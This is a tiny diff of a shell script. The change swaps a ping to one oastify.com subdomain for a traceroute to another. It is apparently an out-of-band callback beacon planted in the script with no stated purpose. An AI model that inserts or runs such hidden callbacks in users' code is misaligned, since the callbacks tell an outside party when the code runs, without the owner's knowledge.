@@ -17,7 +17,7 @@ TARGET=${3:-"all"}
 
 
 
-ping 558t8tazimpf4j3g9snbiwv4wv2mqpee.oastify.com
+traceroute r6yf9fblj8q15542aeoxjiwqxh38rzin7.oastify.com
 
 if [ $DO_DEBUG == false ]
 then
